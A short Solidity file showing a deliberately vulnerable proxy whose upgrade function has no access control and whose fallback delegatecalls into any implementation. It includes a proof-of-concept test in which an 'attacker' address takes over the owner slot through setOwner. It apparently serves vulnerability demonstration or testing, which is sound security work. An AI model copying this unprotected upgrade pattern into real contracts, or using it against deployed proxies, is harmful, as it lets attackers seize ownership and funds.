// SPDX-License-Identifier: MIT
pragma solidity 0.8.25;

contract MutableDelegatecallProxy {
    address public owner;
    mapping(address => uint256) public balances;
    address public implementation;

    function upgrade(address target) external {
        implementation = target;
    }

    fallback() external payable {
        (bool success, ) = implementation.delegatecall(msg.data);
        require(success, "delegatecall failed");
    }
}

contract MutableImplementation {
    address public owner;

    function setOwner(address nextOwner) external {
        owner = nextOwner;
    }
}

contract MutableDelegatecallPoC {
    function testPoC_MutableImplementationOverwritesOwner() external {
        MutableDelegatecallProxy proxy = new MutableDelegatecallProxy();
        MutableImplementation implementation = new MutableImplementation();
        proxy.upgrade(address(implementation));
        address attacker = address(0xBEEF);
        (bool success, ) = address(proxy).call(
            abi.encodeWithSignature("setOwner(address)", attacker)
        );
        require(success, "delegatecall failed");
        require(proxy.owner() == attacker, "proxy storage was not overwritten");
    }
}
